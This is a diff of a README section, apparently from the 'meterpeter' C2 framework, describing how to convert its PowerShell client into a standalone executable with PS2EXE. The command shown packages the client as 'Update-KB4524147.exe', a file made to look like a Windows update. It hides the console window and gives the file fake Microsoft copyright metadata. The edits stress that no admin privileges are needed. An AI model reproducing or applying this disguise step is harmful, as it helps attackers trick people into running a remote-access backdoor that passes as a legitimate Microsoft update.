@@ -247,14 +247,13 @@ Description: Script to convert powershell scripts to standalone executables<br /
 Source     : https://gallery.technet.microsoft.com/scriptcenter/PS2EXE-GUI-Convert-e7cb69d5<br />
 
 ```
-if you wish to deliver your Client as one binary file then ..
 meterpeter users can use this script (manually) to convert the Client.ps1 to Client.exe
 
 ```
 
-- 1º - Copy **`'Update-KB4524147.ps1'`** build by meterpeter to **`'PS2EXE'`** dir<br />
-- 2º - Open Powershell terminal console in **`'PS2EXE'`** directory<br />
-- 3º - Execute the follow command to convert the Client.ps1 to Client.exe<br />
+- 1º - Copy **`'Update-KB4524147.ps1'`** build by meterpeter C2 to **`'PS2EXE'`** dir<br />
+- 2º - Open Powershell terminal console in **`'PS2EXE'`** directory (none admin privs required)<br />
+- 3º - Execute the follow command to convert the Client.ps1 to standalone executable<br />
 ```
 .\ps2exe.ps1 -inputFile 'Update-KB4524147.ps1' -outputFile 'Update-KB4524147.exe' -noConsole -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.6' -description 'meterpeter binary file' -copyright 'Microsoft® Windows® Operative System'
 ```
